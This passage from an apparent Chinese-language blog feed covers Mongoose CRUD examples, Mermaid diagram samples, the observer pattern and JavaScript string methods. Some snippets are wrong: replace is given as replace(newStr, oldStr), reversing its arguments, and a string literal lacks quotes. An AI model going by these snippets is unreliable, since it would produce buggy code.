if(!err) console.log('插入成功')</span></span><br><span class="line"><span class="comment">//   else console.log('插入失败')</span></span><br><span class="line"><span class="comment">// &#125;)</span></span><br></pre></td></tr></table></figure><h3 id="Model的API"><a href="#Model的API" class="headerlink" title="Model的API"></a>Model的API</h3><p><strong>document 是 model 的实例</strong></p><h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// StuModel.create(object1, object2, ..., (err, object1, object2, ...) = &gt; &#123; &#125;)</span></span><br><span class="line"><span class="comment">// StuModel.create(array, (err, array) = &gt; &#123; &#125;)</span></span><br><span class="line">StuModel.create(</span><br><span class="line">  [&#123;</span><br><span class="line">    name: <span class="string">'liming'</span>,</span><br><span class="line">    age: <span class="number">23</span>,</span><br><span class="line">    gender: <span class="string">'male'</span>,</span><br><span class="line">    address: <span class="string">'安徽'</span></span><br><span class="line">  &#125;], (err, array) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(array)</span><br><span class="line">  <span class="keyword">if</span>(!err) <span class="built_in">console</span>.log(<span class="string">'插入成功'</span>)</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">console</span>.log(<span class="string">'插入失败'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * filter 查询条件</span></span><br><span class="line"><span class="comment"> * projection 投影</span></span><br><span class="line"><span class="comment"> * options 查询选项 skip limit</span></span><br><span class="line"><span class="comment"> * callback 回调函数</span></span><br><span class="line"><span class="comment">  Model.find(filter, [projection], [options], [callback])</span></span><br><span class="line"><span class="comment">  Model.findById()</span></span><br><span class="line"><span class="comment">  Model.findByIdAndDelete()</span></span><br><span class="line"><span class="comment">  Model.findByIdAndRemove()</span></span><br><span class="line"><span class="comment">  Model.findByIdAndUpdate()</span></span><br><span class="line"><span class="comment">  Model.findOne()</span></span><br><span class="line"><span class="comment">  Model.findOneAndDelete()</span></span><br><span class="line"><span class="comment">  Model.findOneAndRemove()</span></span><br><span class="line"><span class="comment">  Model.findOneAndReplace()</span></span><br><span class="line"><span class="comment">  Model.findOneAndUpdate()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 StuModel 查询 name 为 jack，并且 age 大于 22的所有array文档，并且只显示 name age 属性，不显示 _id 属性， array并且要跳过 skip 第一条数据</span></span><br><span class="line">StuModel.find(&#123; <span class="attr">name</span>: <span class="string">'jack'</span>, <span class="attr">age</span>: &#123; <span class="attr">$gte</span>: <span class="number">22</span> &#125; &#125;, <span class="string">'name age -_id'</span>, &#123; <span class="attr">skip</span>: <span class="number">1</span> &#125;, (err, docs) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(docs)</span><br><span class="line">  <span class="keyword">if</span>(!err) <span class="built_in">console</span>.log(<span class="string">'查询成功'</span>)</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">console</span>.log(<span class="string">'查询失败'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">StuModel.findOne(&#123; <span class="attr">age</span>: &#123; <span class="attr">$gte</span>: <span class="number">19</span> &#125; &#125;, <span class="string">'name age -_id'</span>, &#123;&#125;, (err, doc) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(doc)</span><br><span class="line">  <span class="keyword">if</span>(!err) <span class="built_in">console</span>.log(<span class="string">'查询成功'</span>)</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">console</span>.log(<span class="string">'查询失败'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">StuModel.findById(<span class="string">'5ee9f47cf67607ea5eda6894'</span>, <span class="string">'name'</span>, &#123; &#125;, (err, doc) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(doc <span class="keyword">instanceof</span> StuModel)</span><br><span class="line">  <span class="keyword">if</span>(!err) <span class="built_in">console</span>.log(<span class="string">'查询成功'</span>)</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">console</span>.log(<span class="string">'查询失败'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Model.updateMany(filter, doc, [options], [callback])</span></span><br><span class="line"><span class="comment">Model.updateOne(filter, doc, [options], [callback])</span></span><br><span class="line"><span class="comment">Model.replaceOne(filter, doc, [options], [callback])</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">StuModel.updateOne(&#123;<span class="attr">name</span>: <span class="string">"houfei"</span>&#125;, &#123;</span><br><span class="line">  $<span class="keyword">set</span>: &#123;</span><br><span class="line">    age: <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;, &#123;<span class="attr">multi</span>: <span class="literal">false</span>&#125;, (err, status) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(status)</span><br><span class="line">  <span class="keyword">if</span>(!err) <span class="built_in">console</span>.log(<span class="string">'修改成功'</span>)</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">console</span>.log(<span class="string">'修改失败'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Model.deleteMany(conditions, [options], [callback])</span></span><br><span class="line"><span class="comment">Model.deleteOne(conditions, [options], [callback])</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">StuModel.deleteOne(&#123;<span class="attr">name</span>: <span class="string">"houfei"</span>&#125;, (err, state) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(state)</span><br><span class="line">  <span class="keyword">if</span>(!err) <span class="built_in">console</span>.log(<span class="string">'删除成功'</span>)</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">console</span>.log(<span class="string">'删除失败'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="Document的API"><a href="#Document的API" class="headerlink" title="Document的API"></a>Document的API</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建 Document 对象</span></span><br><span class="line"><span class="keyword">let</span> stu = <span class="keyword">new</span> StuModel(&#123;</span><br><span class="line">  name: <span class="string">'李白'</span>,</span><br><span class="line">  age: <span class="number">30</span>,</span><br><span class="line">  gender: <span class="string">'female'</span>,</span><br><span class="line">  address: <span class="string">'四川'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="doc-save"><a href="#doc-save" class="headerlink" title="doc.save()"></a><a href="https://mongoosejs.com/docs/api/document.html#document_Document-save" target="_blank" rel="noopener">doc.save()</a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 保存方法 save</span></span><br><span class="line">stu.save(<span class="function">(<span class="params">err, state</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(state)</span><br><span class="line">  <span class="keyword">if</span>(!err) <span class="built_in">console</span>.log(<span class="string">'添加成功'</span>)</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">console</span>.log(<span class="string">'添加失败'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="doc-update"><a href="#doc-update" class="headerlink" title="doc.update()"></a><a href="https://mongoosejs.com/docs/api/document.html#document_Document-update" target="_blank" rel="noopener">doc.update()</a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">StuModel.findOne(&#123;&#125;, (error, doc) =&gt; &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Document.prototype.update(doc, options, callback)</span></span><br><span class="line"><span class="comment">   * doc «Object»</span></span><br><span class="line"><span class="comment">   * options «Object»</span></span><br><span class="line"><span class="comment">   * callback «Function»</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  doc.update(&#123;<span class="attr">$set</span>: &#123;</span><br><span class="line">    age: <span class="number">1</span></span><br><span class="line">  &#125;&#125;,(err, status) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(status)</span><br><span class="line">    <span class="keyword">if</span>(!err) <span class="built_in">console</span>.log(<span class="string">'修改成功'</span>)</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">console</span>.log(<span class="string">'修改失败'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="doc-get-set-id"><a href="#doc-get-set-id" class="headerlink" title="doc.get()|.set()|id"></a><a href="https://mongoosejs.com/docs/api/document.html#document_Document-get" target="_blank" rel="noopener">doc.get()|.set()|id</a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">StuModel.findOne(&#123;&#125;, (error, doc) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(doc.id)</span><br><span class="line">  doc.get(<span class="string">'address'</span>, <span class="built_in">String</span>)</span><br><span class="line">  doc.set(<span class="string">'age'</span>, <span class="number">99</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="doc-toJSON-toObject"><a href="#doc-toJSON-toObject" class="headerlink" title="doc.toJSON()|toObject"></a><a href="https://mongoosejs.com/docs/api/document.html#document_Document-toJSON" target="_blank" rel="noopener">doc.toJSON()|toObject</a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">StuModel.findOne(&#123;&#125;, (error, doc) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> a = doc.toJSON()</span><br><span class="line">  <span class="keyword">let</span> b = doc.toObject()</span><br><span class="line">  <span class="built_in">console</span>.log(a, b)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="Mongoose模块化"><a href="#Mongoose模块化" class="headerlink" title="Mongoose模块化"></a>Mongoose模块化</h3><p><a href="https://www.bilibili.com/video/BV1Lb411V7rv?p=19" target="_blank" rel="noopener"> 视频地址</a></p><h3 id="拓展甘特图"><a href="#拓展甘特图" class="headerlink" title="拓展甘特图"></a>拓展甘特图</h3><p><a href="https://mermaid-js.github.io/mermaid/#/README" target="_blank" rel="noopener">GitHub guide</a></p><h4 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a><a href="https://mermaid-js.github.io/mermaid/#/README?id=flowchart" target="_blank" rel="noopener">流程图</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">    A--&gt;B;</span><br><span class="line">    A--&gt;C;</span><br><span class="line">    B--&gt;D;</span><br><span class="line">    C--&gt;D;</span><br></pre></td></tr></table></figure><h4 id="顺序图"><a href="#顺序图" class="headerlink" title="顺序图"></a><a href="https://mermaid-js.github.io/mermaid/#/README?id=sequence-diagram" target="_blank" rel="noopener">顺序图</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    participant Alice</span><br><span class="line">    participant Bob</span><br><span class="line">    Alice-&gt;&gt;John: Hello John, how are you?</span><br><span class="line">    loop Healthcheck</span><br><span class="line">        John-&gt;&gt;John: Fight against hypochondria</span><br><span class="line">    end</span><br><span class="line">    Note right of John: Rational thoughts &lt;br/&gt;prevail!</span><br><span class="line">    John--&gt;&gt;Alice: Great!</span><br><span class="line">    John-&gt;&gt;Bob: How about you?</span><br><span class="line">    Bob--&gt;&gt;John: Jolly good!</span><br></pre></td></tr></table></figure><h4 id="甘特图"><a href="#甘特图" class="headerlink" title="甘特图"></a><a href="https://mermaid-js.github.io/mermaid/#/README?id=gantt-diagram" target="_blank" rel="noopener">甘特图</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gantt</span><br><span class="line">dateFormat  YYYY-MM-DD</span><br><span class="line">title Adding GANTT diagram to mermaid</span><br><span class="line">excludes weekdays 2014-01-10</span><br><span class="line"></span><br><span class="line">section A section</span><br><span class="line">Completed task            :done,    des1, 2014-01-06,2014-01-08</span><br><span class="line">Active task               :active,  des2, 2014-01-09, 3d</span><br><span class="line">Future task               :         des3, after des2, 5d</span><br><span class="line">Future task2               :         des4, after des3, 5d</span><br></pre></td></tr></table></figure><h4 id="其他一"><a href="#其他一" class="headerlink" title="其他一"></a>其他一</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">    A(开始) --&gt;B(起床)</span><br><span class="line">    B --天气不好--- C&gt;干活]</span><br><span class="line">    C ==&gt; D&#123;休息时间到了&#125;</span><br><span class="line">    D -.yes.-&gt; E((休息))</span><br><span class="line">    D -.no.-&gt; C</span><br><span class="line">    E --&gt; F(吃饭)</span><br></pre></td></tr></table></figure><h4 id="其他二"><a href="#其他二" class="headerlink" title="其他二"></a>其他二</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">对象A-&gt;&gt;对象B:中午吃什么？</span><br><span class="line">对象B-&gt;&gt;对象A: 随便</span><br><span class="line">loop 思考</span><br><span class="line">    对象A-&gt;对象A: 努力搜索</span><br><span class="line">end</span><br><span class="line">对象A--&gt;&gt;对象B: 火锅？</span><br><span class="line">对象B-&gt;&gt;对象A: 可以</span><br><span class="line">Note left of 对象A: 我是一个对象A</span><br><span class="line">Note right of 对象B: 我是一个对象B</span><br><span class="line">participant 对象C</span><br><span class="line">Note over 对象C: 我自己说了算</span><br></pre></td></tr></table></figure><h4 id="其他三"><a href="#其他三" class="headerlink" title="其他三"></a>其他三</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">gantt</span><br><span class="line">        dateFormat  YYYY-MM-DD</span><br><span class="line">        title 软件开发甘特图</span><br><span class="line">        section 设计</span><br><span class="line">        需求:done,des1, 2019-01-06,2019-01-08</span><br><span class="line">        原型:active,des2, 2019-01-09, 3d</span><br><span class="line">        UI设计:des3, after des2, 5d</span><br><span class="line">        未来任务:des4, after des3, 5d</span><br><span class="line"></span><br><span class="line">        section 开发</span><br><span class="line">        学习准备理解需求:crit, done, 2019-01-06,24h</span><br><span class="line">        设计框架:crit, done, after des2, 2d</span><br><span class="line">        开发:crit, active, 3d</span><br><span class="line">        未来任务:crit, 5d</span><br><span class="line">        休息时间:2d</span><br><span class="line"></span><br><span class="line">        section 测试</span><br><span class="line">        功能测试:active, a1, after des3, 3d</span><br><span class="line">        压力测试:after a1, 20h</span><br><span class="line">        测试报告: 48h</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Mongoose 是基于nodejs，使用javascript编程，连接mongodb数据库的软件包，使mongodb的文档数据模型变的优雅起来，方便对mongodb文档型数据库的连接和增删改查等常规数据操作。&lt;/p&gt;
&lt;p&gt;mongoose是当前使用mean（mongod
      
    
    </summary>
    
      <category term="数据库" scheme="http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="MongoDB" scheme="http://yoursite.com/tags/MongoDB/"/>
    
  </entry>
  
  <entry>
    <title>观察者模式</title>
    <link href="http://yoursite.com/posts/9a246216.html"/>
    <id>http://yoursite.com/posts/9a246216.html</id>
    <published>2020-06-18T07:09:21.444Z</published>
    <updated>2020-06-22T10:04:03.834Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Observer-观察者-模式"><a href="#Observer-观察者-模式" class="headerlink" title="Observer(观察者)模式"></a>Observer(观察者)模式</h1><p>参考：</p><p>《JavaScript设计模式》 P42</p><p><a href="https://segmentfault.com/a/1190000012295887" target="_blank" rel="noopener">人人都会设计模式：观察者模式–Observer</a></p><p><a href="https://blog.csdn.net/lm278858445/article/details/78287492" target="_blank" rel="noopener">原生JavaScript实现观察者模式</a></p><p><a href="https://segmentfault.com/a/1190000012547812" target="_blank" rel="noopener">JS 观察者模式</a></p><p><a href="https://segmentfault.com/a/1190000018260980" target="_blank" rel="noopener">观察者模式</a></p><h2 id="什么观察者模式"><a href="#什么观察者模式" class="headerlink" title="什么观察者模式"></a>什么观察者模式</h2><p>第一次听到这个概念是在我刚学习vue的时候，现在已经过去快一年，vue已经基本熟悉了，现在回过头来学习一下这个传说中的观察者模式。</p><p><strong>首先看一下概念：</strong></p><p><img src="/view/posts/9a246216/观察者模式.png" alt="观察者模式"></p><p>一个对象（称为subject）维持一系列依赖于它的对象（观察者），将有关状态的任何变更自动通知给它们。</p><p>当一个目标需要告诉观察者发生什么有趣的事情，它会向观察者广播一个通知（可以包括与通知主题相关的特定数据）</p><p>当我们不再希望某个特定的观察者获得其注册目标发出的改变通知时，改目标可以将它从观察者列表中删除。</p><p>怎么理解呢？<br>我这里做一个比喻：</p><p>将称为subject的被观察者对象视为老师；将一系列观察者视为学生。</p><p>当老师讲课时，学生聚精会神的听课——现在就是老师（被观察者）向学生（观察者）发出一个通知；</p><p>老师讲课时，某一个学生迟到，然后中途加入了听讲的学生行列——这时就是新增加一个观察者；</p><p>老师讲课时，某一个学生肚子疼，中途去了厕所——这时就可以认为删除了一个观察者。</p><p>好了通俗易懂的理解就到这里，现在看看书上的概念：</p><p><em>Subject(目标，被观察者)：</em></p><p>维护一系列观察者，方便添加或删除观察者。</p><p><em>Observer(观察者)：</em></p><p>为那些在目标（被观察者）发生改变时需获得通知的对象提供一个更新的接口。</p><p><em>ConcreateSubject(具体目标)：</em></p><p>状态发生改变时，向 <em>Observer</em> 发出通知，储存 <em>ConcreateSubject</em> 的状态。</p><p><em>ConcreteObserver(具体观察者)：</em></p><p>储存一个指向 <em>ConcreateSubject</em> 的引用，实现 <em>Observer</em> 的更新接口，以使自身状态与目标的状态保持一致。</p><p>那么再说一说常见的观察者模式的例子：</p><p>在前端业务中，浏览器的事件也是观察者模式<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div.onclick = <span class="function"><span class="keyword">function</span> <span class="title">click</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">'这就是一个简单的观察者事件'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>div 的 click 事件是被观察者</li><li>function click是观察者</li><li>function click 订阅 div click 事件，事件发生时，对应的动作就是 alert() </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Observer-观察者-模式&quot;&gt;&lt;a href=&quot;#Observer-观察者-模式&quot; class=&quot;headerlink&quot; title=&quot;Observer(观察者)模式&quot;&gt;&lt;/a&gt;Observer(观察者)模式&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;《JavaSc
      
    
    </summary>
    
      <category term="设计模式" scheme="http://yoursite.com/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
    
      <category term="设计模式" scheme="http://yoursite.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>字符串常用方法</title>
    <link href="http://yoursite.com/posts/47556d42.html"/>
    <id>http://yoursite.com/posts/47556d42.html</id>
    <published>2020-06-18T07:09:21.438Z</published>
    <updated>2020-06-18T07:09:21.438Z</updated>
    
    <content type="html"><![CDATA[<h1 id="字符串常用方法"><a href="#字符串常用方法" class="headerlink" title="字符串常用方法"></a>字符串常用方法</h1><p>​    字符串所有的方法，都 <strong>不会修改字符串本身</strong>(字符串是不可变的)，操作完成会 <strong>返回一个新的字符串</strong>。</p><h2 id="ES5及以前的方法"><a href="#ES5及以前的方法" class="headerlink" title="ES5及以前的方法"></a>ES5及以前的方法</h2><ul><li><p>转换为字符串</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> age = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">var</span> ageStr = age.toString(<span class="string">'进制'</span>) <span class="comment">// 可为：2,8,10,16，不填默认为十进制</span></span><br><span class="line"><span class="comment">// 注意 null 和 undefined 值没有这个方法</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>(age)<span class="comment">// '10'</span></span><br></pre></td></tr></table></figure></li><li><p>字符方法——获取字符串中的单个字符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字符串.charAt(index); <span class="comment">// 返回索引对应的字符</span></span><br><span class="line">字符串[index];      <span class="comment">// 推荐使用</span></span><br></pre></td></tr></table></figure></li><li><p>字符串操作——拼接 和 截取</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拼接</span></span><br><span class="line">字符串.concat(str1,str2,str3...);</span><br><span class="line">拼接符 +     <span class="comment">//推荐使用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 截取</span></span><br><span class="line">字符串.slice(start,end) <span class="comment">// 前包后不包</span></span><br><span class="line"><span class="comment">// slice() substring() substr() 第一个参数是开始位置，</span></span><br><span class="line"><span class="comment">// slice() substring() 但是，第二个参数是结束位置</span></span><br><span class="line"><span class="comment">// substr() 第二个参数是 返回的长度</span></span><br><span class="line"><span class="keyword">let</span> str = abcdefg</span><br><span class="line"><span class="built_in">console</span>.log(str.slice(<span class="number">2</span>,<span class="number">4</span>)); <span class="comment">// cd</span></span><br><span class="line"><span class="built_in">console</span>.log(str.substring(<span class="number">2</span>,<span class="number">4</span>)); <span class="comment">// cd</span></span><br><span class="line"><span class="built_in">console</span>.log(str.substr(<span class="number">2</span>,<span class="number">4</span>)); <span class="comment">// cdef</span></span><br></pre></td></tr></table></figure></li><li><p>字符串位置方法——查询字符是否在字符串中存在</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字符串.indexOf(); </span><br><span class="line">字符串.lastIndexOf();</span><br></pre></td></tr></table></figure></li><li><p>去除空白符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符串.trim();  <span class="comment">// 去除字符串两边的空格</span></span><br></pre></td></tr></table></figure></li><li><p>字母字符大小写转换</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字符串.toUpperCase(); <span class="comment">// 转换大写 重点</span></span><br><span class="line">字符串.toLowerCase(); <span class="comment">// 转换小写 重点</span></span><br></pre></td></tr></table></figure></li><li><p>字符串替换</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符串.replace(newStr,oldStr);</span><br></pre></td></tr></table></figure></li><li><p>字符串分割</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符串.split(sp);  <span class="comment">// 把一个字符串分割成字符串数组。</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="ES6-新方法"><a href="#ES6-新方法" class="headerlink" title="ES6+ 新方法"></a>ES6+ 新方法</h2><p><code>let str = &#39;abcdefg&#39;</code></p><ul><li><p>for···of···字符串的遍历器接口 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// for···of···字符串的遍历器接口</span></span><br><span class="line">    <span class="keyword">for</span>( <span class="keyword">let</span> codePoint <span class="keyword">of</span> str) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(codePoint) <span class="comment">// 返回字符串的每一个字符</span></span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">typeof</span> codePoint) <span class="comment">// string</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>includes() 、startsWith()、 endsWith() 返回的都是boolean值 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes() startsWith() endsWith() 返回的都是boolean值</span></span><br><span class="line"><span class="comment">// includes() 表示是否能找到参数</span></span><br><span class="line"><span class="comment">// startsWith() 表示参数字符串是否在源字符串开始</span></span><br><span class="line"><span class="comment">// endsWith() 表示参数字符串是否在源字符串结尾</span></span><br><span class="line"><span class="built_in">console</span>.log(str.includes(<span class="string">'cd'</span>)) <span class="comment">// 